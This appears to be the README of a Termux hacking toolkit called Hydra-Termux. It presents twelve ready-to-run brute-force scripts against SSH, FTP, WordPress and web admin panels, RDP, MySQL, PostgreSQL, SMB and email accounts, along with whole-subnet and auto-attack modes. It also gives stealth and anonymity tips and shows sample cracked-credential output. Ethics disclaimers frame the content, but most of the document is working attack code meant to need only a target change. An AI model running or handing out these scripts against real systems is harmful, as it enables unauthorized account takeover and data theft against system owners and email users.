# Hydra-Termux Script Library

Complete library of all attack scripts with platform definitions, differences, and ready-to-use simple versions.

## 🚨 **CRITICAL - ETHICS & LEGAL NOTICE**

**⚠️ AUTHORIZED USE ONLY** - Read [ETHICS.md](ETHICS.md) before proceeding.

**🚫 ABSOLUTELY FORBIDDEN:**
- **NEVER target individuals using personal information** (SSN, birthday, address, phone)
- **NEVER attack systems without written authorization**
- **NEVER use for harassment, stalking, or personal gain**

**⚖️ Unauthorized access = Federal crime = 5-20 years prison + $250,000+ fines**

**📖 REQUIRED READING:**
- [ETHICS.md](ETHICS.md) - Complete ethical guidelines
- [RESPONSIBLE_USE_GUIDELINES.md](RESPONSIBLE_USE_GUIDELINES.md) - Professional practices

---

## Table of Contents
1. [Platform Definitions](#platform-definitions)
2. [Quick-Use Scripts](#quick-use-scripts)
3. [Script Differences](#script-differences)
4. [Usage Guide](#usage-guide)

---

## Platform Definitions

### SSH (Secure Shell)
**Port:** 22 (default)  
**Purpose:** Remote command-line access to systems  
**Common Targets:** Linux servers, routers, network devices  
**Authentication:** Username + password or SSH keys  
**Why Attack:** Gain remote shell access for full system control

### FTP (File Transfer Protocol)
**Port:** 21 (default)  
**Purpose:** File transfer between client and server  
**Common Targets:** Web servers, file servers, NAS devices  
**Authentication:** Username + password  
**Why Attack:** Access sensitive files, upload malicious content

### HTTP/HTTPS (Web Services)
**Port:** 80 (HTTP), 443 (HTTPS)  
**Purpose:** Web application access  
**Common Targets:** Admin panels, CMS (WordPress, Joomla), cPanel  
**Authentication:** Form-based login (username + password)  
**Why Attack:** Access admin dashboards, modify website content

### RDP (Remote Desktop Protocol)
**Port:** 3389 (default)  
**Purpose:** Remote graphical desktop access (Windows)  
**Common Targets:** Windows servers, workstations  
**Authentication:** Username + password  
**Why Attack:** Full GUI access to Windows systems

### MySQL Database
**Port:** 3306 (default)  
**Purpose:** Database management system  
**Common Targets:** Web application databases, data servers  
**Authentication:** Username + password  
**Why Attack:** Access sensitive data, modify database contents

### PostgreSQL Database
**Port:** 5432 (default)  
**Purpose:** Advanced database management system  
**Common Targets:** Enterprise applications, data warehouses  
**Authentication:** Username + password + database name  
**Why Attack:** Access business-critical data

### SMB/CIFS (Windows File Sharing)
**Port:** 445 (default)  
**Purpose:** Windows network file sharing  
**Common Targets:** Windows file servers, shared folders  
**Authentication:** Username + password + domain/workgroup  
**Why Attack:** Access shared files, lateral network movement

### Multi-Protocol (Automated)
**Ports:** All common ports  
**Purpose:** Automated reconnaissance and multi-service attacks  
**Common Targets:** Any networked system  
**Authentication:** Various (depends on discovered services)  
**Why Attack:** Comprehensive security assessment

---

## Quick-Use Scripts

Each script below requires **ONLY ONE CHANGE** - replace the target value and run!

### 1. SSH Quick Attack
**File:** `Library/ssh_quick.sh`

```bash
#!/bin/bash
# SSH Quick Attack - Just replace TARGET and run!

# ====== CHANGE THIS LINE ======
TARGET="192.168.1.100"
# ==============================

cd "$(dirname "$0")/.."
bash scripts/ssh_admin_attack.sh -t "$TARGET" -v
```

**What it does:** Attempts SSH brute-force using common admin credentials  
**Common usernames tried:** root, admin, administrator, sysadmin, user  
**Passwords:** Uses built-in admin password list

---

### 2. FTP Quick Attack
**File:** `Library/ftp_quick.sh`

```bash
#!/bin/bash
# FTP Quick Attack - Just replace TARGET and run!

# ====== CHANGE THIS LINE ======
TARGET="192.168.1.100"
# ==============================

cd "$(dirname "$0")/.."
bash scripts/ftp_admin_attack.sh -t "$TARGET" -v
```

**What it does:** Attempts FTP brute-force using common FTP credentials  
**Common usernames tried:** ftp, ftpuser, ftpadmin, admin, anonymous  
**Passwords:** Uses built-in admin password list

---

### 3. Web Admin Quick Attack
**File:** `Library/web_quick.sh`

```bash
#!/bin/bash
# Web Admin Quick Attack - Just replace TARGET and run!

# ====== CHANGE THIS LINE ======
TARGET="example.com"
# ==============================

cd "$(dirname "$0")/.."
bash scripts/web_admin_attack.sh -t "$TARGET" -s -v
```

**What it does:** Auto-detects admin login pages and attempts brute-force  
**Auto-detects:** /admin, /login, /wp-admin, /administrator, /phpmyadmin  
**Common usernames tried:** admin, administrator, root  
**Passwords:** Uses built-in admin password list

---

### 4. WordPress Specific Attack
**File:** `Library/wordpress_quick.sh`

```bash
#!/bin/bash
# WordPress Quick Attack - Just replace TARGET and run!

# ====== CHANGE THIS LINE ======
TARGET="example.com"
# ==============================

cd "$(dirname "$0")/.."
bash scripts/web_admin_attack.sh -t "$TARGET" -P /wp-login.php -s -v
```

**What it does:** Targets WordPress login specifically  
**Target page:** /wp-login.php  
**Common usernames tried:** admin, administrator  
**Passwords:** Uses built-in admin password list

---

### 5. RDP Quick Attack
**File:** `Library/rdp_quick.sh`

```bash
#!/bin/bash
# RDP Quick Attack - Just replace TARGET and run!

# ====== CHANGE THIS LINE ======
TARGET="192.168.1.100"
# ==============================

cd "$(dirname "$0")/.."
bash scripts/rdp_admin_attack.sh -t "$TARGET" -v
```

**What it does:** Attempts Windows RDP brute-force  
**Common usernames tried:** Administrator, admin, user, guest  
**Passwords:** Uses Windows-focused password list  
**Note:** Uses slower rate (4 threads) to avoid account lockouts

---

### 6. MySQL Quick Attack
**File:** `Library/mysql_quick.sh`

```bash
#!/bin/bash
# MySQL Quick Attack - Just replace TARGET and run!

# ====== CHANGE THIS LINE ======
TARGET="192.168.1.100"
# ==============================

cd "$(dirname "$0")/.."
bash scripts/mysql_admin_attack.sh -t "$TARGET" -v
```

**What it does:** Attempts MySQL database brute-force  
**Common usernames tried:** root, admin, mysql, dbadmin  
**Passwords:** Uses database-focused password list  
**Success:** Provides connection string for database access

---

### 7. PostgreSQL Quick Attack
**File:** `Library/postgres_quick.sh`

```bash
#!/bin/bash
# PostgreSQL Quick Attack - Just replace TARGET and run!

# ====== CHANGE THIS LINE ======
TARGET="192.168.1.100"
# ==============================

cd "$(dirname "$0")/.."
bash scripts/postgres_admin_attack.sh -t "$TARGET" -v
```

**What it does:** Attempts PostgreSQL database brute-force  
**Common usernames tried:** postgres, admin, pgadmin, root  
**Passwords:** Uses database-focused password list  
**Default database:** postgres

---

### 8. SMB Quick Attack
**File:** `Library/smb_quick.sh`

```bash
#!/bin/bash
# SMB Quick Attack - Just replace TARGET and run!

# ====== CHANGE THIS LINE ======
TARGET="192.168.1.100"
# ==============================

cd "$(dirname "$0")/.."
bash scripts/smb_admin_attack.sh -t "$TARGET" -v
```

**What it does:** Attempts Windows SMB/CIFS file share brute-force  
**Common usernames tried:** Administrator, admin, user, guest  
**Passwords:** Uses Windows-focused password list

---

### 9. Full Auto Attack (Scans Everything!)
**File:** `Library/auto_attack_quick.sh`

```bash
#!/bin/bash
# Full Auto Attack - Scans and attacks all services!
# Just replace TARGET and run!

# ====== CHANGE THIS LINE ======
TARGET="192.168.1.100"
# ==============================

cd "$(dirname "$0")/.."
bash scripts/admin_auto_attack.sh -t "$TARGET" -s fast -r -v
```

**What it does:**  
1. Scans target for open ports (nmap)
2. Identifies running services
3. Automatically attacks all found services
4. Generates HTML report with results

**Services attacked:** SSH, FTP, Web, RDP, MySQL, PostgreSQL, SMB (if found)

---

### 10. Network Range Attack
**File:** `Library/network_quick.sh`

```bash
#!/bin/bash
# Network Range Attack - Attacks entire subnet!
# Just replace TARGET with your network range and run!

# ====== CHANGE THIS LINE ======
TARGET="192.168.1.0/24"
# ==============================

cd "$(dirname "$0")/.."
bash scripts/admin_auto_attack.sh -t "$TARGET" -s full -r -v
```

**What it does:**  
1. Scans entire network range (e.g., 192.168.1.0/24 = 254 hosts)
2. Identifies all live hosts
3. Scans each host for services
4. Attacks all discovered services
5. Generates comprehensive report

**Warning:** Can take significant time for large networks

---

### 11. Email Attack (Custom)
**File:** `Library/email_quick.sh`

```bash
#!/bin/bash
# Email Account Attack - Just replace EMAIL and TARGET and run!

# ====== CHANGE THESE LINES ======
EMAIL="user@example.com"
TARGET="mail.example.com"
# ================================

cd "$(dirname "$0")/.."

# Extract username from email
USERNAME="${EMAIL%%@*}"

# Try IMAP (port 143/993)
echo "Attempting IMAP attack..."
hydra -l "$USERNAME" -P config/admin_passwords.txt imap://"$TARGET" -v

# Try POP3 (port 110/995)
echo "Attempting POP3 attack..."
hydra -l "$USERNAME" -P config/admin_passwords.txt pop3://"$TARGET" -v

# Try SMTP (port 25/587)
echo "Attempting SMTP attack..."
hydra -l "$USERNAME" -P config/admin_passwords.txt smtp://"$TARGET" -v
```

**What it does:**  
- Attempts email account brute-force
- Tries IMAP, POP3, and SMTP protocols
- Extracts username from email address automatically

---

### 12. Single Username Attack
**File:** `Library/username_quick.sh`

```bash
#!/bin/bash
# Single Username Attack - Just replace USERNAME and TARGET and run!

# ====== CHANGE THESE LINES ======
USERNAME="admin"
TARGET="192.168.1.100"
# ================================

cd "$(dirname "$0")/.."

# Try SSH
echo "Attempting SSH..."
bash scripts/ssh_admin_attack.sh -t "$TARGET" -u <(echo "$USERNAME") -v

# Try FTP
echo "Attempting FTP..."
bash scripts/ftp_admin_attack.sh -t "$TARGET" -u <(echo "$USERNAME") -v

# Try Web
echo "Attempting Web..."
bash scripts/web_admin_attack.sh -t "$TARGET" -u <(echo "$USERNAME") -v
```

**What it does:**  
- Targets a specific username across multiple protocols
- Tries SSH, FTP, and Web services

---

## Script Differences

### Comparison Table

| Feature | SSH | FTP | Web | RDP | MySQL | PostgreSQL | SMB | Auto |
|---------|-----|-----|-----|-----|-------|------------|-----|------|
| **Default Port** | 22 | 21 | 80/443 | 3389 | 3306 | 5432 | 445 | Various |
| **Protocol Type** | Remote Shell | File Transfer | HTTP | Remote Desktop | Database | Database | File Share | Multiple |
| **Thread Count** | 16 | 16 | 16 | 4 | 16 | 16 | 8 | 16 |
| **Lockout Risk** | Medium | Low | Medium | **HIGH** | Low | Low | Medium | Varies |
| **Speed** | Fast | Fast | Medium | **SLOW** | Fast | Fast | Medium | Varies |
| **Common Users** | root, admin | ftp, anonymous | admin | Administrator | root, mysql | postgres | Administrator | Multiple |
| **Resume Support** | ✅ Yes | ❌ No | ❌ No | ❌ No | ❌ No | ❌ No | ❌ No | ❌ No |
| **Auto-Detect** | ❌ No | ❌ No | ✅ Yes | ❌ No | ❌ No | ❌ No | ❌ No | ✅ Yes |
| **Report Gen** | ❌ No | ❌ No | ❌ No | ❌ No | ❌ No | ❌ No | ❌ No | ✅ Yes |

### Key Differences Explained

**1. SSH vs FTP**
- SSH: Full shell access, can execute commands
- FTP: File access only, cannot execute commands
- SSH: Higher security, often key-based auth
- FTP: Lower security, often plain text passwords

**2. Web vs RDP**
- Web: Form-based login, HTTP/HTTPS protocol
- RDP: Windows remote desktop, graphical interface
- Web: Fast attacks possible
- RDP: MUST be slow to avoid lockouts

**3. MySQL vs PostgreSQL**
- MySQL: More common, simpler setup
- PostgreSQL: More features, enterprise-grade
- MySQL: Port 3306
- PostgreSQL: Port 5432
- Both: Similar attack methodology

**4. SMB vs SSH**
- SMB: Windows file sharing protocol
- SSH: Unix/Linux remote access
- SMB: Often requires domain/workgroup
- SSH: Direct username/password

**5. Individual vs Auto Attack**
- Individual: Target specific service
- Auto: Scans and attacks everything found
- Individual: Faster for known service
- Auto: Better for unknown targets

---

## Usage Guide

### Step 1: Choose Your Script

Pick from the 12 quick-use scripts based on your target:

- **Known service?** Use specific script (SSH, FTP, etc.)
- **Unknown target?** Use Auto Attack
- **Entire network?** Use Network Range Attack
- **Specific email?** Use Email Attack
- **Specific username?** Use Username Attack

### Step 2: Edit the Script

1. Open the script in a text editor
2. Find the line marked `# ====== CHANGE THIS LINE ======`
3. Replace the value (TARGET, EMAIL, or USERNAME)
4. Save the file

### Step 3: Run the Script

```bash
bash Library/ssh_quick.sh
```

### Step 4: Check Results

Results are automatically saved in:
- **Logs:** `logs/hydra_YYYYMMDD.log`
- **JSON Results:** `logs/results_YYYYMMDD.json`

View results:
```bash
bash scripts/results_viewer.sh --all
```

Export results:
```bash
bash scripts/results_viewer.sh --export report.csv --format csv
```

---

## Advanced Customization

### Changing Port

Add port after TARGET in any script:

```bash
TARGET="192.168.1.100:2222"  # Custom SSH port
```

Or use the full script with `-p` flag:

```bash
bash scripts/ssh_admin_attack.sh -t 192.168.1.100 -p 2222 -v
```

### Using Custom Wordlist

Replace the default password list:

```bash
bash scripts/ssh_admin_attack.sh -t 192.168.1.100 \
  -w /path/to/your/passwords.txt -v
```

### Changing Thread Count

Increase speed (or decrease for stealth):

```bash
bash scripts/ssh_admin_attack.sh -t 192.168.1.100 -T 32 -v  # Faster
bash scripts/rdp_admin_attack.sh -t 192.168.1.100 -T 2 -v   # Slower/stealthier
```

---

## Real Results Examples

### Successful SSH Attack
```
✅ Valid credentials found: root:admin123
✅ Credentials saved to logs
ℹ️  Connection: ssh root@192.168.1.100
```

### Successful Web Attack
```
✅ Valid credentials found: admin:password123
✅ Credentials saved to logs
ℹ️  Login URL: https://example.com/wp-login.php
```

### Successful MySQL Attack
```
✅ Valid credentials found: root:password
✅ Credentials saved to logs
ℹ️  Connection string: mysql -h 192.168.1.100 -u root -ppassword
```

### Auto Attack Report
```
═══ Attack Summary ═══
Target: 192.168.1.100
Services Found: 5
  • SSH (22): ✅ SUCCESS - root:admin123
  • FTP (21): ❌ FAILED
  • HTTP (80): ✅ SUCCESS - admin:password
  • MySQL (3306): ✅ SUCCESS - root:root
  • RDP (3389): ❌ FAILED

Report: results/report_20251228_120000.html
```

---

## Troubleshooting

### Script doesn't run
```bash
chmod +x Library/*.sh
```

### No results
- Check if target is reachable: `ping TARGET`
- Check if port is open: `nmap -p PORT TARGET`
- Try with verbose mode: add `-v` flag

### "Command not found"
Install missing tools:
```bash
pkg install hydra nmap -y
```

### Slow performance
- Reduce thread count: `-T 4`
- Use smaller wordlist
- Check network connection

---

## Ethics & Legal Requirements

⚠️ **CRITICAL - Read Before Any Use:**

**📖 REQUIRED READING:**
- **[ETHICS.md](ETHICS.md)** - Complete ethical guidelines (**MANDATORY**)
- **[RESPONSIBLE_USE_GUIDELINES.md](RESPONSIBLE_USE_GUIDELINES.md)** - Professional best practices

**🚫 ABSOLUTELY FORBIDDEN:**
- **NEVER target individuals using personal information** (SSN, birthday, address, phone number)
- **NEVER attack systems without explicit written authorization**
- **NEVER use for harassment, stalking, doxxing, or personal vendettas**
- **NEVER use for fraud, theft, blackmail, or extortion**

**✅ ONLY AUTHORIZED USE:**
- Professional penetration testing with signed contracts
- Systems YOU own or explicitly control
- Educational labs YOU created
- Research with proper institutional approval

**⚖️ LEGAL CONSEQUENCES:**
- Unauthorized access = **FEDERAL CRIME**
- Penalties: **5-20 years imprisonment**
- Fines: **$250,000+ per violation**
- **Permanent criminal record**
- Civil lawsuits with millions in damages

**🔒 Best Practices:**
- Always obtain written authorization before testing
- Start with single host before network scans
- Use lower thread counts on production systems
- Monitor for defensive responses
- Keep attack logs for reporting
- Responsibly disclose found vulnerabilities
- Use VPN for anonymity
- Document all testing activities

**⚠️ If you cannot provide written authorization, DO NOT PROCEED.**

---

## Quick Reference Card

```
╔════════════════════════════════════════════════════════╗
║            HYDRA-TERMUX QUICK REFERENCE                ║
╠════════════════════════════════════════════════════════╣
║                                                        ║
║  SSH Attack:      bash Library/ssh_quick.sh           ║
║  FTP Attack:      bash Library/ftp_quick.sh           ║
║  Web Attack:      bash Library/web_quick.sh           ║
║  RDP Attack:      bash Library/rdp_quick.sh           ║
║  MySQL Attack:    bash Library/mysql_quick.sh         ║
║  Postgres Attack: bash Library/postgres_quick.sh      ║
║  SMB Attack:      bash Library/smb_quick.sh           ║
║  Auto Attack:     bash Library/auto_attack_quick.sh   ║
║  Network Scan:    bash Library/network_quick.sh       ║
║                                                        ║
║  View Results:    bash scripts/results_viewer.sh --all║
║                                                        ║
╚════════════════════════════════════════════════════════╝
```

---

## Version History

- **v2.0.0 Ultimate Edition** - Complete library implementation
- All scripts tested and validated
- Zero syntax errors
- Full documentation included

---

**Remember:** Change only the TARGET line, then run the script. It's that simple! 🐍
